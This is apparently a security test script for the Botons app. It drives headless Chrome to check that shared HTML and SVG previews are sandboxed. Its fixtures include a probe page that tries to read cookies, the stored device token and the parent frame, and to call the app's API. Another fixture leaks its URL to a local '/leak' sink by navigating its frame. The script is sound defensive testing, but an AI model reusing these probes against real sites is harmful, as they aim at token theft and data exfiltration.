// `npm run check:preview`: open shared files in the real web app in headless Chrome, against a throwaway
// server (temp BOTONS_HOME, 127.0.0.1, a free port, the mock provider, no Tailscale), and check that:
// - an HTML file a Boton shares opens from its chat chip in the file viewer, in a sandboxed frame,
//   and its script runs (it draws an SVG);
// - that script runs in an opaque origin: it can't read the app's cookies or storage (the device token),
//   can't reach the app's page, can't call /api or anything else (fetch, XHR, WebSocket, EventSource,
//   images, forms), and no such request reaches the server;
// - "Open in a new tab" gets the same sandbox as a page of its own;
// - an SVG shows as an image without running its script, and a file with no preview gets a card with
//   its type, size, a Download button and why;
// - an HTML file deleted after its link was made, or grown past the limit since its folder was listed,
//   gets that card with why, not an error inside the frame;
// - a page can't navigate the app's page, but can load another address in its own frame, which takes what
//   it puts in that URL (here to a local sink): the sandbox is not network isolation, so this check proves
//   the limit the docs state, and that the viewer then closes the frame.
// Exits 1 with what failed. `--html <file>` also opens that file (say, a design a Boton made) and checks
// it draws; `--out <dir>` saves screenshots. Neither is copied anywhere but the temp server.
import { spawn } from 'node:child_process';
import diagnostics from 'node:diagnostics_channel';
import { copyFileSync, existsSync, mkdirSync, mkdtempSync, rmSync, truncateSync, writeFileSync } from 'node:fs';
import { createServer as createHttpServer, type IncomingMessage } from 'node:http';
import { createServer } from 'node:net';
import { tmpdir } from 'node:os';
import { basename, dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { parseArgs } from 'node:util';
import { createApp } from '../server/src/app.ts';
import { approvePairingRequest, createPairingRequest } from '../server/src/auth.ts';
import { loadConfig } from '../server/src/config.ts';
import { PREVIEW_MAX_BYTES } from '../shared/files.ts';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const { values: opt } = parseArgs({
  options: {
    chrome: { type: 'string', default: process.env.CHROME_BIN || ['/opt/google/chrome/chrome', '/usr/bin/google-chrome', '/usr/bin/chromium'].find((p) => existsSync(p)) || 'google-chrome' },
    html: { type: 'string' },
    out: { type: 'string' },
    'skip-build': { type: 'string' },
  },
});
const home = mkdtempSync(join(tmpdir(), 'botons-preview-'));
process.env.BOTONS_LOG_LEVEL = 'error';
const log = (...a: unknown[]) => console.log('[preview]', ...a);
const failures: string[] = [];
const check = (ok: unknown, what: string) => {
  if (ok) log(`ok   ${what}`);
  else {
    failures.push(what);
    console.error(`[preview] FAIL ${what}`);
  }
};

/** A design page like the ones Botons make: it draws its art with script, then tries every way out. */
const FIXTURE = String.raw`<!doctype html>
<html><head><meta charset="utf-8"><title>Avatar directions</title>
<style>body{font:15px system-ui;margin:24px;background:#fafafa}figure{display:inline-block;margin:8px;text-align:center}</style></head>
<body><h1>Three avatar directions</h1><div id="art"></div><pre id="probe-results"></pre>
<script>
const NS = 'http://www.w3.org/2000/svg';
for (const [i, hue] of [[0, 45], [1, 200], [2, 320]]) {
  const fig = document.createElement('figure');
  const svg = document.createElementNS(NS, 'svg');
  svg.setAttribute('width', '140'); svg.setAttribute('height', '140'); svg.setAttribute('viewBox', '0 0 140 140');
  const g = document.createElementNS(NS, 'radialGradient'); g.id = 'g' + i;
  for (const [o, l] of [[0, 80], [1, 45]]) { const s = document.createElementNS(NS, 'stop'); s.setAttribute('offset', o); s.setAttribute('stop-color', 'hsl(' + hue + ' 80% ' + l + '%)'); g.append(s); }
  const defs = document.createElementNS(NS, 'defs'); defs.append(g); svg.append(defs);
  const body = document.createElementNS(NS, 'ellipse'); body.setAttribute('cx', 70); body.setAttribute('cy', 76); body.setAttribute('rx', 46); body.setAttribute('ry', 56); body.setAttribute('fill', 'url(#g' + i + ')'); svg.append(body);
  const eye = document.createElementNS(NS, 'circle'); eye.setAttribute('cx', 70); eye.setAttribute('cy', 58); eye.setAttribute('r', 18); eye.setAttribute('fill', '#fff'); eye.setAttribute('stroke', '#555'); eye.setAttribute('stroke-width', 6); svg.append(eye);
  const pupil = document.createElementNS(NS, 'circle'); pupil.setAttribute('cx', 70); pupil.setAttribute('cy', 58); pupil.setAttribute('r', 7); pupil.setAttribute('fill', '#3a2a1a'); svg.append(pupil);
  fig.append(svg);
  const cap = document.createElement('figcaption'); cap.textContent = 'Direction ' + (i + 1); fig.append(cap);
  document.getElementById('art').append(fig);
}
document.body.dataset.drawn = String(document.querySelectorAll('#art svg *').length);

const violations = [];
document.addEventListener('securitypolicyviolation', (e) => violations.push(e.effectiveDirective));
const attempt = (f) => { try { return 'allowed:' + JSON.stringify(f()); } catch (e) { return 'threw:' + e.name; } };
const settle = (p, ms = 1500) => Promise.race([p.then((v) => 'allowed:' + v, (e) => 'rejected:' + e.name), new Promise((r) => setTimeout(() => r('timeout'), ms))]);
const api = new URL('/api/bots?probe=preview', location.href).href;
(async () => {
  const r = { framed: window !== top };
  r.origin = self.origin;
  r.cookie = attempt(() => document.cookie);
  r.localStorage = attempt(() => localStorage.getItem('botons.deviceToken'));
  r.sessionStorage = attempt(() => sessionStorage.length);
  r.indexedDB = await settle(new Promise((ok, no) => { try { const q = indexedDB.open('probe'); q.onsuccess = () => ok('opened'); q.onerror = () => no(q.error); } catch (e) { no(e); } }));
  if (r.framed) {
    r.parentDocument = attempt(() => parent.document.title);
    r.parentStorage = attempt(() => parent.localStorage.getItem('botons.deviceToken'));
  }
  r.fetchRelative = await settle(fetch('/api/bots?probe=preview').then((x) => x.status));
  r.fetchAbsolute = await settle(fetch(api, { mode: 'no-cors' }).then((x) => x.type));
  r.fetchElsewhere = await settle(fetch('https://example.com/?probe=preview', { mode: 'no-cors' }).then((x) => x.type));
  r.xhr = await settle(new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', api); x.onload = () => ok(x.status); x.onerror = () => no(new Error('xhr')); x.send(); }));
  r.webSocket = await settle(new Promise((ok, no) => { try { const w = new WebSocket(api.replace(/^http/, 'ws')); w.onopen = () => ok('open'); w.onerror = () => no(new Error('ws')); } catch (e) { no(e); } }));
  r.eventSource = await settle(new Promise((ok, no) => { const s = new EventSource(api); s.onopen = () => ok('open'); s.onerror = () => { s.close(); no(new Error('es')); }; }));
  r.image = await settle(new Promise((ok, no) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => no(new Error('img')); i.src = api; }));
  r.popup = attempt(() => window.open('about:blank') === null ? 'blocked' : 'opened');
  r.form = attempt(() => { const f = document.createElement('form'); f.method = 'post'; f.action = api; f.target = 'probe-sink'; const sink = document.createElement('iframe'); sink.name = 'probe-sink'; document.body.append(sink, f); f.submit(); return 'submitted'; });
  await new Promise((done) => setTimeout(done, 500));
  r.violations = [...new Set(violations)].sort();
  document.getElementById('probe-results').textContent = JSON.stringify(r);
  document.body.dataset.probed = '1';
  if (r.framed) parent.postMessage({ previewProbe: r }, '*');
})();
</script></body></html>`;

/** A page that tries to take the app's page somewhere, then loads another address in its own frame with what it holds. */
const leavingPage = (sink: string) => `<!doctype html><meta charset="utf-8"><title>Leaving</title><p>Leaving soon</p>
<script>
setTimeout(() => {
  try { top.location.href = ${JSON.stringify(sink)} + '/top'; } catch (e) {}
  location.href = ${JSON.stringify(sink)} + '/leak?' + new URLSearchParams({ title: document.title, url: location.href });
}, 400);
</script>`;

const SVG = `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120"><circle cx="60" cy="60" r="50" fill="#e8b500"/><script>parent.__svgRan = true; top.__svgRan = true;</script></svg>`;

class Cdp {
  #ws: WebSocket;
  #id = 0;
  #pending = new Map<number, { resolve: (v: any) => void; reject: (e: Error) => void }>();
  #handlers = new Map<string, ((p: any, sessionId?: string) => void)[]>();
  constructor(ws: WebSocket) {
    this.#ws = ws;
    ws.addEventListener('message', (ev) => {
      const msg = JSON.parse(String(ev.data));
      if (msg.id !== undefined) {
        const p = this.#pending.get(msg.id);
        this.#pending.delete(msg.id);
        if (msg.error) p?.reject(new Error(`${msg.error.message} ${msg.error.data ?? ''}`));
        else p?.resolve(msg.result);
      } else for (const h of this.#handlers.get(msg.method) ?? []) h(msg.params, msg.sessionId);
    });
  }
  static async connect(url: string) {
    const ws = new WebSocket(url);
    await new Promise((res, rej) => {
      ws.addEventListener('open', res, { once: true });
      ws.addEventListener('error', rej, { once: true });
    });
    return new Cdp(ws);
  }
  send<T = any>(method: string, params: object = {}, sessionId?: string): Promise<T> {
    const id = ++this.#id;
    this.#ws.send(JSON.stringify({ id, method, params, ...(sessionId && { sessionId }) }));
    return new Promise((resolve, reject) => this.#pending.set(id, { resolve, reject }));
  }
  on(method: string, h: (p: any, sessionId?: string) => void) {
    this.#handlers.set(method, [...(this.#handlers.get(method) ?? []), h]);
  }
  async eval<T = any>(expression: string, sessionId?: string, contextId?: number): Promise<T> {
    const r = await this.send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true, ...(contextId && { contextId }) }, sessionId);
    if (r.exceptionDetails) throw new Error(`page: ${r.exceptionDetails.exception?.description ?? r.exceptionDetails.text}`);
    return r.result.value as T;
  }
  close() {
    this.#ws.close();
  }
}

function freePort(): Promise<number> {
  return new Promise((res) => {
    const s = createServer();
    s.listen(0, '127.0.0.1', () => {
      const p = (s.address() as { port: number }).port;
      s.close(() => res(p));
    });
  });
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const cleanups: (() => unknown)[] = [];

async function main() {
  const webDist = opt['skip-build'] ? resolve(opt['skip-build']) : join(home, 'web-dist');
  if (!opt['skip-build']) {
    log('building web …');
    await new Promise<void>((res, rej) => {
      const p = spawn(join(root, 'node_modules/.bin/vite'), ['build', '--outDir', webDist, '--emptyOutDir', '--logLevel', 'warn'], { cwd: join(root, 'web'), stdio: 'inherit' });
      p.on('exit', (c) => (c === 0 ? res() : rej(new Error(`vite build exited ${c}`))));
    });
  }

  const port = await freePort();
  const cfg = loadConfig({
    BOTONS_HOME: home,
    BOTONS_HOST: '127.0.0.1',
    BOTONS_PORT: String(port),
    BOTONS_ENABLE_MOCK: '1',
    BOTONS_NO_TAILSCALE: '1',
    BOTONS_LOG_LEVEL: 'error',
    BOTONS_CLAUDE_BIN: join(home, 'no-claude'),
    BOTONS_CODEX_BIN: join(home, 'no-codex'),
  });
  cfg.webDist = webDist;
  const app = createApp(cfg, undefined, { tailnet: null });
  await app.listen();
  cleanups.push(() => app.close());
  const base = `http://127.0.0.1:${port}`;

  // Every request the server gets, to show none came from the preview's probes.
  let workspace = '';
  const seen: string[] = [];
  // Deleted the moment its preview page is asked for: after the viewer made its link, before the frame loads.
  const onRequest = ({ request }: { request: IncomingMessage }) => {
    seen.push(request.url ?? '');
    if (request.url?.includes('/files/preview?path=design%2Fgone.html&')) rmSync(join(workspace, 'design/gone.html'), { force: true });
  };
  diagnostics.subscribe('http.server.request.start', onRequest as (m: unknown) => void);
  cleanups.push(() => diagnostics.unsubscribe('http.server.request.start', onRequest as (m: unknown) => void));

  const { secret, code } = createPairingRequest(app.store.db, 'preview check');
  approvePairingRequest(app.store.db, code);
  const token: string = (await (await fetch(`${base}/api/auth/pair`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ secret, label: 'preview check' }) })).json()).token;
  const call = (method: string, path: string, body?: unknown) => fetch(base + path, { method, headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: body === undefined ? undefined : JSON.stringify(body) });
  const setup = await call('PATCH', '/api/setup', { complete: true });
  if (!setup.ok) throw new Error(`setup: ${setup.status} ${await setup.text()}`);
  await call('PATCH', '/api/settings', { ownerName: 'Sam' });

  const kevin = app.store.createBot({ name: 'Kevin', provider: 'mock' }, app.providers.ids(), 'mock');
  workspace = kevin.workspace;
  // Where a leaving page sends what it holds: a server of this check's own, standing in for anywhere.
  const leaks: string[] = [];
  const sink = createHttpServer((req, res) => {
    leaks.push(req.url ?? '');
    res.writeHead(200, { 'content-type': 'text/html' }).end('<p>elsewhere</p>');
  });
  const sinkPort = await freePort();
  await new Promise<void>((r) => sink.listen(sinkPort, '127.0.0.1', r));
  cleanups.push(() => new Promise((r) => sink.close(r)));
  const sinkBase = `http://127.0.0.1:${sinkPort}`;
  const put = (rel: string, content: string | Buffer) => {
    mkdirSync(dirname(join(kevin.workspace, rel)), { recursive: true });
    writeFileSync(join(kevin.workspace, rel), content);
  };
  put('design/directions.html', FIXTURE);
  put('design/logo.svg', SVG);
  put('design/assets.zip', Buffer.alloc(2048, 7));
  put('design/gone.html', FIXTURE);
  put('design/leaves.html', leavingPage(sinkBase));
  put('later/grows.html', '<p>small for now</p>');
  const extra = opt.html ? `design/${basename(opt.html)}` : null;
  if (extra) {
    mkdirSync(join(kevin.workspace, 'design'), { recursive: true });
    copyFileSync(resolve(opt.html!), join(kevin.workspace, extra));
  }
  for (const path of ['design/directions.html', 'design/logo.svg', 'design/assets.zip', 'design/gone.html', 'design/leaves.html', ...(extra ? [extra] : [])]) await app.engine.shareFile(kevin.id, path, undefined);

  // Chrome, in its own profile.
  const chrome = spawn(opt.chrome!, [
    '--headless=new', '--remote-debugging-port=0', `--user-data-dir=${join(home, 'chrome')}`, '--no-first-run', '--no-default-browser-check', '--disable-extensions',
    '--disable-background-networking', '--disable-sync', '--disable-component-update', '--window-size=1280,900', 'about:blank',
  ], { stdio: ['ignore', 'ignore', 'pipe'] });
  // Gone before its profile folder is deleted, or it writes the folder back.
  cleanups.push(async () => {
    if (chrome.exitCode !== null || chrome.signalCode !== null) return;
    const exited = new Promise((r) => chrome.once('exit', r));
    chrome.kill('SIGTERM');
    await Promise.race([exited, sleep(5000).then(() => chrome.kill('SIGKILL'))]);
    await Promise.race([exited, sleep(2000)]);
  });
  const wsUrl = await new Promise<string>((res, rej) => {
    let buf = '';
    chrome.stderr!.on('data', (d) => {
      buf += d;
      const m = /DevTools listening on (ws:\/\/\S+)/.exec(buf);
      if (m) res(m[1]);
    });
    chrome.on('error', rej);
    chrome.on('exit', (c) => rej(new Error(`chrome exited ${c}: ${buf}`)));
  });
  const browser = await Cdp.connect(wsUrl);
  cleanups.push(() => browser.close());
  log((await browser.send('Browser.getVersion')).product);

  // One page, with every frame in it attached (a sandboxed frame may run in a process of its own).
  const { targetId } = await browser.send('Target.createTarget', { url: 'about:blank' });
  const { sessionId: page } = await browser.send('Target.attachToTarget', { targetId, flatten: true });
  const frames: string[] = [];
  browser.on('Target.attachedToTarget', (p) => {
    if (p.targetInfo.type === 'iframe') frames.push(p.sessionId);
    void browser.send('Runtime.runIfWaitingForDebugger', {}, p.sessionId).catch(() => {});
  });
  const contexts: { id: number; frameId: string; origin: string }[] = [];
  browser.on('Runtime.executionContextCreated', (p) => contexts.push({ id: p.context.id, frameId: p.context.auxData?.frameId, origin: p.context.origin }));
  await browser.send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true }, page);
  await browser.send('Page.enable', {}, page);
  await browser.send('Runtime.enable', {}, page);
  await browser.send('Network.enable', {}, page);
  await browser.send('Emulation.setDeviceMetricsOverride', { width: 1280, height: 900, deviceScaleFactor: 1, mobile: false }, page);
  // A cookie on the app's origin, which the preview must not read.
  await browser.send('Network.setCookie', { name: 'botons_probe', value: 'app-cookie-secret', url: base, path: '/' }, page);
  await browser.send('Page.addScriptToEvaluateOnNewDocument', {
    source: `if (location.origin === ${JSON.stringify(base)} && !location.pathname.startsWith('/api/')) {
      localStorage.setItem('botons.deviceToken', ${JSON.stringify(token)});
      window.__probes = [];
      addEventListener('message', (e) => { if (e.data && e.data.previewProbe) window.__probes.push({ origin: e.origin, probe: e.data.previewProbe }); });
    }`,
  }, page);

  const evalIn = <T = any>(expr: string) => browser.eval<T>(expr, page);
  const waitFor = async (expr: string, ms = 20_000) => {
    const end = Date.now() + ms;
    while (Date.now() < end) {
      if (await evalIn(`!!(${expr})`).catch(() => false)) return;
      await sleep(50);
    }
    const shown = await evalIn<string>('location.href + "\\n" + document.body.innerText.slice(0, 500)').catch(() => '?');
    throw new Error(`timed out waiting for ${expr}; page shows: ${shown}`);
  };
  const shot = async (name: string, sessionId = page) => {
    if (!opt.out) return;
    mkdirSync(resolve(opt.out), { recursive: true });
    const { data } = await browser.send('Page.captureScreenshot', { format: 'png' }, sessionId);
    writeFileSync(join(resolve(opt.out), `${name}.png`), Buffer.from(data, 'base64'));
  };
  /** Evaluate in the preview frame, wherever Chrome runs it. */
  const inFrame = async <T = any>(src: string, expr: string): Promise<T> => {
    const want = base + src;
    for (const session of frames) {
      const href = await browser.eval<string>('location.href', session).catch(() => '');
      if (href === want) return browser.eval<T>(expr, session);
    }
    const tree = await browser.send('Page.getFrameTree', {}, page);
    const child = (tree.frameTree.childFrames ?? []).find((f: any) => f.frame.url === want);
    if (!child) throw new Error(`no preview frame for ${src} (${frames.length} attached; tree: ${JSON.stringify(tree.frameTree.childFrames?.map((f: any) => f.frame.url))})`);
    const { executionContextId } = await browser.send('Page.createIsolatedWorld', { frameId: child.frame.id, worldName: 'check' }, page);
    return browser.eval<T>(expr, page, executionContextId);
  };
  const openChip = async (path: string) => {
    await evalIn(`[...document.querySelectorAll('.chip-link')].find((b) => b.title === ${JSON.stringify(path)}).click(); 0`);
    await waitFor(`document.querySelector('.file-preview .file-title strong')?.textContent === ${JSON.stringify(basename(path))}`);
  };

  await browser.send('Page.navigate', { url: `${base}/#/m/${kevin.id}` }, page);
  await waitFor(`document.querySelectorAll('.chip-link').length >= 5`);

  // 1. The HTML file, from its chip in the chat.
  const before = seen.length;
  await openChip('design/directions.html');
  await waitFor(`document.querySelector('iframe.file-frame')`);
  const frameAttrs = await evalIn<{ sandbox: string; src: string }>(`(() => { const f = document.querySelector('iframe.file-frame'); return { sandbox: f.getAttribute('sandbox'), src: f.getAttribute('src') }; })()`);
  check(frameAttrs.sandbox === 'allow-scripts', `the viewer frames it with sandbox="allow-scripts" (got ${frameAttrs.sandbox})`);
  check(/\/files\/preview\?path=design%2Fdirections\.html&key=/.test(frameAttrs.src), 'the frame loads the preview page with its own key');
  await waitFor(`window.__probes.length > 0`);
  const { origin: msgOrigin, probe } = (await evalIn<any[]>('window.__probes'))[0];
  log('framed probes:', JSON.stringify(probe));
  check(msgOrigin === 'null' && probe.origin === 'null', 'the framed page has an opaque origin ("null")');
  const drawn = Number(await inFrame(frameAttrs.src, 'document.body.dataset.drawn'));
  check(drawn >= 15, `its script ran and drew the SVG art (${drawn} SVG elements)`);
  check(await inFrame(frameAttrs.src, `document.querySelector('#art svg').getBoundingClientRect().width > 100`), 'the drawn art has a size on screen');
  const denied = (v: string) => /^(threw|rejected):/.test(v) || v === 'timeout';
  for (const k of ['cookie', 'localStorage', 'sessionStorage', 'indexedDB', 'parentDocument', 'parentStorage', 'fetchRelative', 'fetchAbsolute', 'fetchElsewhere', 'xhr', 'webSocket', 'eventSource', 'image']) {
    check(denied(probe[k]), `framed: ${k} is denied (${probe[k]})`);
  }
  check(!JSON.stringify(probe).includes('app-cookie-secret') && !JSON.stringify(probe).includes(token), 'framed: neither the app cookie nor the device token reached the page');
  check(probe.popup === 'allowed:"blocked"' || denied(probe.popup), `framed: popups are blocked (${probe.popup})`);
  check(probe.violations.includes('connect-src'), `framed: CSP reported connect-src violations (${probe.violations.join(', ')})`);
  check(await evalIn(`document.body.innerText.includes('Shown in a sandbox')`), 'the viewer says the page is sandboxed');
  await sleep(300);
  const leaked = seen.slice(before).filter((u) => u.includes('probe=preview') || (u.startsWith('/api/bots?')));
  check(leaked.length === 0, `no request from the framed page reached the server (${leaked.join(', ') || 'none'})`);
  await shot('viewer-html');

  // 2. "Open in a new tab": the same page on its own, with the same sandbox.
  const tabUrl = await evalIn<string>(`document.querySelector('.file-actions a[aria-label="Open in a new tab"]')?.getAttribute('href') ?? ''`);
  check(tabUrl === frameAttrs.src, 'Open in a new tab links the same preview page');
  const headers = await fetch(base + tabUrl);
  await headers.text();
  check(/^sandbox allow-scripts;/.test(headers.headers.get('content-security-policy') ?? ''), 'the tab gets the same CSP sandbox header');
  const tab = await browser.send('Target.createTarget', { url: 'about:blank' });
  const { sessionId: tabSession } = await browser.send('Target.attachToTarget', { targetId: tab.targetId, flatten: true });
  await browser.send('Page.enable', {}, tabSession);
  await browser.send('Page.navigate', { url: base + tabUrl }, tabSession);
  const beforeTab = seen.length;
  let tabProbe: any = null;
  for (let i = 0; i < 100 && !tabProbe; i++) {
    await sleep(100);
    tabProbe = await browser.eval<string>(`document.body?.dataset.probed ? document.getElementById('probe-results').textContent : ''`, tabSession).then((t) => (t ? JSON.parse(t) : null), () => null);
  }
  check(tabProbe, 'the tab ran its probes');
  if (tabProbe) {
    log('tab probes:', JSON.stringify(tabProbe));
    check(!tabProbe.framed && tabProbe.origin === 'null', 'the tab has an opaque origin too');
    for (const k of ['cookie', 'localStorage', 'sessionStorage', 'indexedDB', 'fetchRelative', 'fetchAbsolute', 'fetchElsewhere', 'xhr', 'webSocket', 'eventSource', 'image']) check(denied(tabProbe[k]), `tab: ${k} is denied (${tabProbe[k]})`);
    check(tabProbe.popup === 'allowed:"blocked"' || denied(tabProbe.popup), `tab: popups are blocked (${tabProbe.popup})`);
    check(Number(await browser.eval('document.body.dataset.drawn', tabSession)) >= 15, 'tab: its script drew the art');
  }
  await sleep(300);
  const tabLeaked = seen.slice(beforeTab).filter((u) => u.includes('probe=preview') || u.startsWith('/api/bots?'));
  check(tabLeaked.length === 0, `no request from the tab reached the server (${tabLeaked.join(', ') || 'none'})`);
  await shot('tab-html', tabSession);
  await browser.send('Target.closeTarget', { targetId: tab.targetId });

  // 3. The SVG: an image, its script never run.
  await openChip('design/logo.svg');
  await waitFor(`document.querySelector('img.file-image.svg')?.complete`);
  check(await evalIn(`document.querySelector('img.file-image.svg').naturalWidth > 0`), 'the SVG displays as an image');
  check(!(await evalIn('window.__svgRan === true')), "the SVG's script did not run");
  await shot('viewer-svg');

  // 4. A file with no preview: the card.
  await openChip('design/assets.zip');
  await waitFor(`document.querySelector('.file-card')`);
  const card = await evalIn<string>(`document.querySelector('.file-card').innerText`);
  check(/application\/zip/.test(card) && /2 KB/.test(card) && /Download/.test(card) && /doesn't preview this kind of file/.test(card), `a zip gets the card with type, size, Download and why (${card.replace(/\s+/g, ' ')})`);
  check(await evalIn(`!!document.querySelector('.file-card a[download]')?.getAttribute('href')?.includes('download=1')`), 'its Download button downloads the file');
  await shot('viewer-card');

  // 5. Deleted after the viewer made its link: the card says why, nothing of the server's JSON in a frame.
  await openChip('design/gone.html');
  await waitFor(`document.querySelector('.file-card')`);
  const goneCard = await evalIn<string>(`document.querySelector('.file-card').innerText`);
  check(/moved or deleted after it was opened/.test(goneCard) && /text\/html/.test(goneCard) && /Download/.test(goneCard), `a page deleted before its frame loaded gets the card with why (${goneCard.replace(/\s+/g, ' ')})`);
  check(!(await evalIn('!!document.querySelector("iframe.file-frame")')) && !(await evalIn('!!document.querySelector(\'.file-actions a[aria-label="Open in a new tab"]\')')), 'and no frame or new-tab link is left');
  await shot('viewer-gone');

  // 6. Listed small, then grown past the limit: the link is refused by its size now, and the card says so.
  await evalIn(`document.querySelector('.crumbs button').click(); 0`);
  await waitFor(`[...document.querySelectorAll('.file-row')].some((b) => b.innerText.includes('later'))`);
  await evalIn(`[...document.querySelectorAll('.file-row')].find((b) => b.innerText.includes('later')).click(); 0`);
  await waitFor(`[...document.querySelectorAll('.file-row')].some((b) => b.innerText.includes('grows.html'))`);
  truncateSync(join(kevin.workspace, 'later/grows.html'), PREVIEW_MAX_BYTES + 1);
  await evalIn(`[...document.querySelectorAll('.file-row')].find((b) => b.innerText.includes('grows.html')).click(); 0`);
  await waitFor(`document.querySelector('.file-card')`);
  const bigCard = await evalIn<string>(`document.querySelector('.file-card').innerText`);
  check(/too big to preview here/.test(bigCard) && !/20 B/.test(bigCard) && !(await evalIn('!!document.querySelector("iframe.file-frame")')), `a page grown past the limit since it was listed gets the card (${bigCard.replace(/\s+/g, ' ')})`);

  // 7. A page that leaves: it can't take the app's page anywhere, but it can load another address in its
  // own frame, with whatever it puts in the URL. The viewer then closes it.
  await openChip('design/leaves.html');
  await waitFor(`document.querySelector('.file-card')`);
  const leftCard = await evalIn<string>(`document.querySelector('.file-card').innerText`);
  check(/loaded another page in its frame, so Botons closed it/.test(leftCard), `the viewer closes a frame that loads another page (${leftCard.replace(/\s+/g, ' ')})`);
  check((await evalIn<string>('location.origin')) === base && !leaks.includes('/top'), "the page couldn't navigate the app's page");
  await sleep(300);
  const leak = leaks.find((u) => u.startsWith('/leak?'));
  check(leak, 'as documented, the sandbox is not network isolation: the page reached another address by navigating its frame');
  if (leak) {
    const sent = new URLSearchParams(leak.slice('/leak?'.length));
    const filesKey: string = (await (await call('GET', '/api/auth/status')).json()).urlKeys.files;
    check(!leak.includes(token) && !leak.includes(encodeURIComponent(filesKey)) && !leak.includes(filesKey), 'what it could send holds neither the device token nor its files key');
    check(/[?&]key=/.test(sent.get('url') ?? '') && (sent.get('url') ?? '').includes('leaves.html'), "only its own page's preview link (the limit the docs state)");
  }
  await shot('viewer-left');

  // 8. Optionally, a real design page.
  if (extra) {
    await openChip(extra);
    await waitFor(`document.querySelector('iframe.file-frame')`);
    const src = await evalIn<string>(`document.querySelector('iframe.file-frame').getAttribute('src')`);
    let count = 0;
    for (let i = 0; i < 100 && count === 0; i++) {
      await sleep(100);
      count = await inFrame<number>(src, `document.querySelectorAll('svg *, canvas').length`).catch(() => 0);
    }
    check(count > 0, `${basename(extra)} drew in the viewer (${count} SVG or canvas elements)`);
    await sleep(500);
    await shot('viewer-extra');
  }
  log(`server saw ${seen.length} requests; frames attached: ${frames.length}, contexts: ${contexts.length}`);
}

try {
  await main();
} catch (err) {
  failures.push(String((err as Error)?.stack ?? err));
  console.error('[preview]', err);
} finally {
  for (const c of cleanups.reverse()) await Promise.resolve(c()).catch(() => {});
  // Chrome descendants can finish profile writes just after the browser process exits.
  rmSync(home, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
}
if (failures.length) {
  console.error(`[preview] ${failures.length} failed`);
  process.exit(1);
}
log('all good');
process.exit(0);
